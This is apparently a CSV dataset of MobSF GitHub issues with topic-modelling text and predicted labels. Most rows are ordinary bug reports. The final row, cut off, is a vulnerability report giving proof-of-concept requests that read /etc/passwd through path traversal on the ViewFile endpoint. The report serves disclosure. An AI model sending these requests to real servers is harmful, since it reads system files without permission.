issue_no,repo,issue_url,title,description,patched_file_types,text_for_topic_modeling,prediction,confidence,combined_text
842,Mobile-Security-Framework-MobSF,https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/842,Recent Scans: Scan Time,There is no time field in recent scan.I think the time field is important for apk scanning.It is recommended to add this field in recent scan.Thank you.,source-file | source-file | source-file | source-file | other-file,recent scans scan time time field recent scan think time field important apk scanning recommended field recent scan thank,bug,0.8,Recent Scans: Scan Time There is no time field in recent scan.I think the time field is important for apk scanning.It is recommended to add this field in recent scan.Thank you.
2424,Mobile-Security-Framework-MobSF,https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/2424,Allow numeric bundleIds for iOS,"## ENVIRONMENT  OS and Version: MacOS Sonoma, but running in docker Python Version: 3.10 MobSF Version: 4.0.5  ## EXPLANATION OF THE ISSUE  Uploading an iOS build with a numeric bundleId will result in issues opening ""/recent_scans"" . The error message is already stating, that the used regex is not capable of finding numeric bundleIds.  ## STEPS TO REPRODUCE THE ISSUE  1. upload ipa with numeric bundleId 2. open mobsf interface 3. click on ""Recent Scans"" 4. observe ""Server Error (500)"".  ## LOG FILE  [INFO] 17/Sep/2024 10:18:06 - __ __ _ ____ _____ _ _ ___ | \/ | ___ | |__/ ___|| ___|_ _| || | / _ \ | |\/| |/ _ \| '_ \___ \| |_ \ \ / / || |_| | | | | | | | (_) | |_) |__) | _| \ V /|__ _| |_| | |_| |_|\___/|_.__/____/|_| \_/ |_|(_)___/ [INFO] 17/Sep/2024 10:18:06 - Author: Ajin Abraham | opensecurity.in [INFO] 17/Sep/2024 10:18:06 - Mobile Security Framework v4.0.5 [INFO] 17/Sep/2024 10:18:06 - API Key read from environment variable REST API Key:  Default Credentials: mobsf/mobsf [INFO] 17/Sep/2024 10:18:06 - OS Environment: Linux (ubuntu 22.04 Jammy Jellyfish) Linux-6.6.26-linuxkit-aarch64-with-glibc2.35 [INFO] 17/Sep/2024 10:18:06 - MobSF Basic Environment Check [INFO] 17/Sep/2024 10:18:06 - Checking for Update. [INFO] 17/Sep/2024 10:18:06 - No updates available. [INFO] 17/Sep/2024 10:18:10 - API Key read from environment variable [ERROR] 17/Sep/2024 10:18:12 - Internal Server Error: /recent_scans/ Traceback (most recent call last): File ""/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py"", line 55, in inner response = get_response(request) File ""/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py"", line 197, in _get_response response = wrapped_callback(request, *callback_args, **callback_kwargs) File ""/home/mobsf/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/authentication.py"", line 41, in wrapper return lg(func)(request, *args, **kwargs) File ""/usr/local/lib/python3.10/dist-packages/django/contrib/auth/decorators.py"", line 23, in _wrapper_view return view_func(request, *args, **kwargs) File ""/home/mobsf/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/home.py"", line 309, in recent_scans return render(request, template, context) File ""/usr/local/lib/python3.10/dist-packages/django/shortcuts.py"", line 25, in render content = loader.render_to_string(template_name, context, request, using=using) File ""/usr/local/lib/python3.10/dist-packages/django/template/loader.py"", line 62, in render_to_string return template.render(context, request) File ""/usr/local/lib/python3.10/dist-packages/django/template/backends/django.py"", line 61, in render return self.template.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 171, in render return self._render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 163, in _render return self.nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/loader_tags.py"", line 159, in render return compiled_parent._render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 163, in _render return self.nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/loader_tags.py"", line 65, in render result = block.nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 242, in render nodelist.append(node.render_annotated(context)) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 326, in render return nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 326, in render return nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 326, in render return nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 479, in render url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app) File ""/usr/local/lib/python3.10/dist-packages/django/urls/base.py"", line 88, in reverse return resolver._reverse_with_prefix(view, prefix, *args, **kwargs) File ""/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py"", line 851, in _reverse_with_prefix raise NoReverseMatch(msg) django.urls.exceptions.NoReverseMatch: Reverse for 'ios_view_report' with keyword arguments '{'bundle_id': '12345678'}' not found. 1 pattern(s) tried: ['ios/view_report/(?P<bundle_id>([a-zA-Z]{1}[\\w.-]{1,255}))$'] ",source-file | other-file | source-file | other-file,allow numeric bundleids ios environment macos sonoma running docker python mobsf explanation uploading ios numeric bundleid result issues opening recent scans message already stating used regex capable finding numeric bundleids steps reproduce upload ipa numeric bundleid open mobsf interface click recent scans observe server log sep sep ajin abraham opensecurity sep mobile security framework sep api key read environment variable rest api key default credentials mobsf mobsf sep environment linux ubuntu jammy jellyfish linux linuxkit aarch glibc sep mobsf basic environment check sep checking sep updates available sep api key read environment variable sep internal server recent scans traceback recent call last local python dist packages django core handlers exception inner response get response local python dist packages django core handlers base get response response wrapped callback callback args callback kwargs home mobsf mobile security framework mobsf mobsf mobsf views authentication wrapper return func args kwargs local python dist packages django contrib auth decorators wrapper view return view func args kwargs home mobsf mobile security framework mobsf mobsf mobsf views home recent scans return render template context local python dist packages django shortcuts render content loader render string template name context local python dist packages django template loader render string return template render context local python dist packages django template backends django render return self template render context local python dist packages django template base render return self render context local python dist packages django template base render return self nodelist render context local python dist packages django template base render return safestring join node render annotated context node self local python dist packages django template base listcomp return safestring join node render annotated context node self local python dist packages django template base render annotated return self render context local python dist packages django template loader tags render return compiled parent render context local python dist packages django template base render return self nodelist render context local python dist packages django template base render return safestring join node render annotated context node self local python dist packages django template base listcomp return safestring join node render annotated context node self local python dist packages django template base render annotated return self render context local python dist packages django template loader tags render result block nodelist render context local python dist packages django template base render return safestring join node render annotated context node self local python dist packages django template base listcomp return safestring join node render annotated context node self local python dist packages django template base render annotated return self render context local python dist packages django template defaulttags render nodelist append node render annotated context local python dist packages django template base render annotated return self render context local python dist packages django template defaulttags render return nodelist render context local python dist packages django template base render return safestring join node render annotated context node self local python dist packages django template base listcomp return safestring join node render annotated context node self local python dist packages django template base render annotated return self render context local python dist packages django template defaulttags render return nodelist render context local python dist packages django template base render return safestring join node render annotated context node self local python dist packages django template base listcomp return safestring join node render annotated context node self local python dist packages django template base render annotated return self render context local python dist packages django template defaulttags render return nodelist render context local python dist packages django template base render return safestring join node render annotated context node self local python dist packages django template base listcomp return safestring join node render annotated context node self local python dist packages django template base render annotated return self render context local python dist packages django template defaulttags render url reverse view name args args kwargs kwargs current app current app local python dist packages django urls base reverse return resolver reverse prefix view prefix args kwargs local python dist packages django urls resolvers reverse prefix raise noreversematch msg django urls exceptions noreversematch reverse ios view report keyword arguments bundle found pattern tried ios view report bundle,bug,0.95,"Allow numeric bundleIds for iOS ## ENVIRONMENT  OS and Version: MacOS Sonoma, but running in docker Python Version: 3.10 MobSF Version: 4.0.5  ## EXPLANATION OF THE ISSUE  Uploading an iOS build with a numeric bundleId will result in issues opening ""/recent_scans"" . The error message is already stating, that the used regex is not capable of finding numeric bundleIds.  ## STEPS TO REPRODUCE THE ISSUE  1. upload ipa with numeric bundleId 2. open mobsf interface 3. click on ""Recent Scans"" 4. observe ""Server Error (500)"".  ## LOG FILE  [INFO] 17/Sep/2024 10:18:06 - __ __ _ ____ _____ _ _ ___ | \/ | ___ | |__/ ___|| ___|_ _| || | / _ \ | |\/| |/ _ \| '_ \___ \| |_ \ \ / / || |_| | | | | | | | (_) | |_) |__) | _| \ V /|__ _| |_| | |_| |_|\___/|_.__/____/|_| \_/ |_|(_)___/ [INFO] 17/Sep/2024 10:18:06 - Author: Ajin Abraham | opensecurity.in [INFO] 17/Sep/2024 10:18:06 - Mobile Security Framework v4.0.5 [INFO] 17/Sep/2024 10:18:06 - API Key read from environment variable REST API Key:  Default Credentials: mobsf/mobsf [INFO] 17/Sep/2024 10:18:06 - OS Environment: Linux (ubuntu 22.04 Jammy Jellyfish) Linux-6.6.26-linuxkit-aarch64-with-glibc2.35 [INFO] 17/Sep/2024 10:18:06 - MobSF Basic Environment Check [INFO] 17/Sep/2024 10:18:06 - Checking for Update. [INFO] 17/Sep/2024 10:18:06 - No updates available. [INFO] 17/Sep/2024 10:18:10 - API Key read from environment variable [ERROR] 17/Sep/2024 10:18:12 - Internal Server Error: /recent_scans/ Traceback (most recent call last): File ""/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py"", line 55, in inner response = get_response(request) File ""/usr/local/lib/python3.10/dist-packages/django/core/handlers/base.py"", line 197, in _get_response response = wrapped_callback(request, *callback_args, **callback_kwargs) File ""/home/mobsf/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/authentication.py"", line 41, in wrapper return lg(func)(request, *args, **kwargs) File ""/usr/local/lib/python3.10/dist-packages/django/contrib/auth/decorators.py"", line 23, in _wrapper_view return view_func(request, *args, **kwargs) File ""/home/mobsf/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/home.py"", line 309, in recent_scans return render(request, template, context) File ""/usr/local/lib/python3.10/dist-packages/django/shortcuts.py"", line 25, in render content = loader.render_to_string(template_name, context, request, using=using) File ""/usr/local/lib/python3.10/dist-packages/django/template/loader.py"", line 62, in render_to_string return template.render(context, request) File ""/usr/local/lib/python3.10/dist-packages/django/template/backends/django.py"", line 61, in render return self.template.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 171, in render return self._render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 163, in _render return self.nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/loader_tags.py"", line 159, in render return compiled_parent._render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 163, in _render return self.nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/loader_tags.py"", line 65, in render result = block.nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 242, in render nodelist.append(node.render_annotated(context)) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 326, in render return nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 326, in render return nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 326, in render return nodelist.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in render return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 1000, in <listcomp> return SafeString("""".join([node.render_annotated(context) for node in self])) File ""/usr/local/lib/python3.10/dist-packages/django/template/base.py"", line 961, in render_annotated return self.render(context) File ""/usr/local/lib/python3.10/dist-packages/django/template/defaulttags.py"", line 479, in render url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app) File ""/usr/local/lib/python3.10/dist-packages/django/urls/base.py"", line 88, in reverse return resolver._reverse_with_prefix(view, prefix, *args, **kwargs) File ""/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py"", line 851, in _reverse_with_prefix raise NoReverseMatch(msg) django.urls.exceptions.NoReverseMatch: Reverse for 'ios_view_report' with keyword arguments '{'bundle_id': '12345678'}' not found. 1 pattern(s) tried: ['ios/view_report/(?P<bundle_id>([a-zA-Z]{1}[\\w.-]{1,255}))$'] "
2043,Mobile-Security-Framework-MobSF,https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/2043,MobSF Static Analysis fails on apks upload via api,"<!-- ## IMPORTANT --> <!-- Issues are ONLY for reporting BUGS. For support, feature requests, questions, queries, and discussions use our slack channel for limited support. Join MobSF Slack channel: https://join.slack.com/t/mobsf/shared_invite/zt-153nfus2r-hMCGrwzm8Lyy3OxsihnolQ --> <!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel:https://join.slack.com/t/mobsf/shared_invite/zt-153nfus2r-hMCGrwzm8Lyy3OxsihnolQ Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --> ## ENVIRONMENT  OS and Version: Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64) Python Version: Python 3.10.6 MobSF Version: VERSION = '3.5.2'  ## EXPLANATION OF THE ISSUE We are using MobSF via a git clone of master, with the latest pulled down. When attempting to upload an apks file via curl to the /scan endpoint, a 500 is returned, with the below error in the logs. According to #1728 and the [releases page](https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases), the apks format has been supported since v3.4.6 Beta. Looking through the code changes for that support, it appears that api_static_analysis.py did not get updated to support the addition of .apks files. I'm mostly just curious if this was intentional or a mistake. <!-- If you see errors while running setup/run scripts, join MobSF Slack channel: https://bit.ly/3mCMNOx to get limited support. --> ## STEPS TO REPRODUCE THE ISSUE  1. Upload apks file using curl to /api/v1/scan with scan_type=apks 2. View MobSF logs.  ## LOG FILE  __ __ _ ____ _____ _____ ____ | \/ | ___ | |__/ ___|| ___|_ _|___ / | ___| | |\/| |/ _ \| '_ \___ \| |_ \ \ / / |_ \ |___ \ | | | | (_) | |_) |__) | _| \ V / ___) | ___) | |_| |_|\___/|_.__/____/|_| \_/ |____(_)____/ [INFO] 03/Oct/2022 21:24:08 - ESC[1mESC[34mMobile Security Framework v3.5.2 BetaESC[0m [INFO] 03/Oct/2022 21:24:08 - OS: Linux [INFO] 03/Oct/2022 21:24:08 - Platform: Linux-5.15.0-48-generic-x86_64-with-glibc2.35 [INFO] 03/Oct/2022 21:24:08 - Dist: ubuntu 22.04 Jammy Jellyfish [INFO] 03/Oct/2022 21:24:08 - MobSF Basic Environment Check [WARNING] 03/Oct/2022 21:24:08 - Dynamic Analysis related functions will not work. Make sure a Genymotion Android VM/Android Studio Emulator is running before performing Dynamic Analysis. [INFO] 03/Oct/2022 21:24:09 - Checking for Update. [INFO] 03/Oct/2022 21:24:09 - No updates available. [ERROR] 03/Oct/2022 21:24:20 - Internal Server Error: /api/v1/scan Traceback (most recent call last): File ""/opt/Mobile-Security-Framework-MobSF/venv/lib/python3.10/site-packages/django/core/handlers/exception.py"", line 55, in inner response = get_response(request) File ""/opt/Mobile-Security-Framework-MobSF/venv/lib/python3.10/site-packages/django/core/handlers/base.py"", line 197, in _get_response response = wrapped_callback(request, *callback_args, **callback_kwargs) File ""/opt/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/helpers.py"", line 92, in wrapper return func(*args, **kwargs) File ""/opt/Mobile-Security-Framework-MobSF/venv/lib/python3.10/site-packages/django/views/decorators/csrf.py"", line 54, in wrapped_view return view_func(*args, **kwargs) File ""/opt/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/api/api_static_analysis.py"", line 76, in api_scan return response UnboundLocalError: local variable 'response' referenced before assignment  <!-- BEFORE POSTING YOUR ISSUE/BUG - These comments won't show up when you submit the issue. - GitHub issues ARE NOT FOR FEATURE REQUESTS, SUPPORT, DISCUSSIONS AND QUESTIONS! - If you have questions, use our slack channel. Join MobSF Slack channel: https://bit.ly/3mCMNOx - Reproduce issue in the latest master and try to add as much detail as possible. - Search this repository (top of the page) for the issue and it has not been fixed or reported already. - Once you open a bug, you should also provide additional information if requested. - Failure to do so in 25 days will result in closure of the bug without further communication. -->",source-file | other-file | config-file | documentation-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | source-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | config-file | documentation-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | test-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | source-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | other-file | other-file | config-file | test-file | container-file | documentation-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | documentation-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | documentation-file | documentation-file | documentation-file | documentation-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | test-file | test-file | test-file | test-file | other-file | test-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | documentation-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | source-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | config-file | source-file | other-file | config-file | config-file | other-file | source-file | config-file | other-file | other-file | source-file | other-file | other-file | other-file | test-file | test-file | other-file | config-file | container-file | other-file | documentation-file | other-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | test-file | test-file | other-file | documentation-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | documentation-file | documentation-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | documentation-file | documentation-file | documentation-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | other-file | config-file | source-file | config-file | config-file | source-file | other-file | source-file | config-file | other-file | test-file | config-file | container-file | source-file | source-file | source-file | source-file | source-file | source-file | source-file | other-file | source-file | other-file | source-file | source-file | source-file | source-file | other-file | source-file | source-file | other-file,mobsf static analysis fails apks upload via api important issues reporting bugs feature requests questions queries discussions use slack channel limited join mobsf slack channel https join slack mobsf shared invite nfus hmcgrwzm lyy oxsihnolq see errors running setup scripts mostly installed required dependencies correctly look errors figure causing solve accordingly make sure installed required dependencies correct versions per latest documentation still find dead end join mobsf slack channel https join slack mobsf shared invite nfus hmcgrwzm lyy oxsihnolq please post help github issues definitely waste time get closed without response environment ubuntu lts gnu linux generic python python mobsf explanation mobsf via git clone latest pulled attempting upload apks via curl scan endpoint returned logs according releases page https github mobsf mobile security framework mobsf releases apks format supported since beta looking changes appears api static analysis get updated addition apks files mostly curious intentional mistake see errors running setup scripts join mobsf slack channel https bit mcmnox get limited steps reproduce upload apks curl api scan scan type apks view mobsf logs log oct esc mesc mmobile security framework betaesc oct linux oct platform linux generic glibc oct dist ubuntu jammy jellyfish oct mobsf basic environment check warning oct dynamic analysis related functions work make sure genymotion android android studio emulator running performing dynamic analysis oct checking oct updates available oct internal server api scan traceback recent call last opt mobile security framework mobsf venv python site packages django core handlers exception inner response get response opt mobile security framework mobsf venv python site packages django core handlers base get response response wrapped callback callback args callback kwargs opt mobile security framework mobsf mobsf mobsf views helpers wrapper return func args kwargs opt mobile security framework mobsf venv python site packages django views decorators csrf wrapped view return view func args kwargs opt mobile security framework mobsf mobsf mobsf views api api static analysis api scan return response unboundlocalerror local variable response referenced assignment posting bug comments show submit github issues feature requests discussions questions questions use slack channel join mobsf slack channel https bit mcmnox reproduce latest much detail possible search repository top page fixed reported already open bug also provide additional information requested failure days result closure bug without communication,bug,0.95,"MobSF Static Analysis fails on apks upload via api <!-- ## IMPORTANT --> <!-- Issues are ONLY for reporting BUGS. For support, feature requests, questions, queries, and discussions use our slack channel for limited support. Join MobSF Slack channel: https://join.slack.com/t/mobsf/shared_invite/zt-153nfus2r-hMCGrwzm8Lyy3OxsihnolQ --> <!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel:https://join.slack.com/t/mobsf/shared_invite/zt-153nfus2r-hMCGrwzm8Lyy3OxsihnolQ Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --> ## ENVIRONMENT  OS and Version: Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64) Python Version: Python 3.10.6 MobSF Version: VERSION = '3.5.2'  ## EXPLANATION OF THE ISSUE We are using MobSF via a git clone of master, with the latest pulled down. When attempting to upload an apks file via curl to the /scan endpoint, a 500 is returned, with the below error in the logs. According to #1728 and the [releases page](https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases), the apks format has been supported since v3.4.6 Beta. Looking through the code changes for that support, it appears that api_static_analysis.py did not get updated to support the addition of .apks files. I'm mostly just curious if this was intentional or a mistake. <!-- If you see errors while running setup/run scripts, join MobSF Slack channel: https://bit.ly/3mCMNOx to get limited support. --> ## STEPS TO REPRODUCE THE ISSUE  1. Upload apks file using curl to /api/v1/scan with scan_type=apks 2. View MobSF logs.  ## LOG FILE  __ __ _ ____ _____ _____ ____ | \/ | ___ | |__/ ___|| ___|_ _|___ / | ___| | |\/| |/ _ \| '_ \___ \| |_ \ \ / / |_ \ |___ \ | | | | (_) | |_) |__) | _| \ V / ___) | ___) | |_| |_|\___/|_.__/____/|_| \_/ |____(_)____/ [INFO] 03/Oct/2022 21:24:08 - ESC[1mESC[34mMobile Security Framework v3.5.2 BetaESC[0m [INFO] 03/Oct/2022 21:24:08 - OS: Linux [INFO] 03/Oct/2022 21:24:08 - Platform: Linux-5.15.0-48-generic-x86_64-with-glibc2.35 [INFO] 03/Oct/2022 21:24:08 - Dist: ubuntu 22.04 Jammy Jellyfish [INFO] 03/Oct/2022 21:24:08 - MobSF Basic Environment Check [WARNING] 03/Oct/2022 21:24:08 - Dynamic Analysis related functions will not work. Make sure a Genymotion Android VM/Android Studio Emulator is running before performing Dynamic Analysis. [INFO] 03/Oct/2022 21:24:09 - Checking for Update. [INFO] 03/Oct/2022 21:24:09 - No updates available. [ERROR] 03/Oct/2022 21:24:20 - Internal Server Error: /api/v1/scan Traceback (most recent call last): File ""/opt/Mobile-Security-Framework-MobSF/venv/lib/python3.10/site-packages/django/core/handlers/exception.py"", line 55, in inner response = get_response(request) File ""/opt/Mobile-Security-Framework-MobSF/venv/lib/python3.10/site-packages/django/core/handlers/base.py"", line 197, in _get_response response = wrapped_callback(request, *callback_args, **callback_kwargs) File ""/opt/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/helpers.py"", line 92, in wrapper return func(*args, **kwargs) File ""/opt/Mobile-Security-Framework-MobSF/venv/lib/python3.10/site-packages/django/views/decorators/csrf.py"", line 54, in wrapped_view return view_func(*args, **kwargs) File ""/opt/Mobile-Security-Framework-MobSF/mobsf/MobSF/views/api/api_static_analysis.py"", line 76, in api_scan return response UnboundLocalError: local variable 'response' referenced before assignment  <!-- BEFORE POSTING YOUR ISSUE/BUG - These comments won't show up when you submit the issue. - GitHub issues ARE NOT FOR FEATURE REQUESTS, SUPPORT, DISCUSSIONS AND QUESTIONS! - If you have questions, use our slack channel. Join MobSF Slack channel: https://bit.ly/3mCMNOx - Reproduce issue in the latest master and try to add as much detail as possible. - Search this repository (top of the page) for the issue and it has not been fixed or reported already. - Once you open a bug, you should also provide additional information if requested. - Failure to do so in 25 days will result in closure of the bug without further communication. -->"
1197,Mobile-Security-Framework-MobSF,https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/1197,[Security] Local file reading regression < 3.0.0,"<!-- ## IMPORTANT --> <!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel: http://tiny.cc/mobsf Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --> ## ENVIRONMENT  Docker latest version  ## EXPLANATION OF THE ISSUE It is possible to read any file on the system. ## STEPS TO REPRODUCE THE ISSUE 1st poc (specify absolute path):  GET /ViewFile/?file=/etc/passwd&md5=376a1470cd79dc44a96615337c5b51c2&type=ios HTTP/1.1 Host: 0.0.0.0:8000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3971.0 Safari/537.36 autochrome/blue Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close  2nd poc (specify path instead of real md5):  GET /ViewFile/?file=etc/passwd&md5=../../../../../../../../../..&type=ios HTTP/1.1 Host: 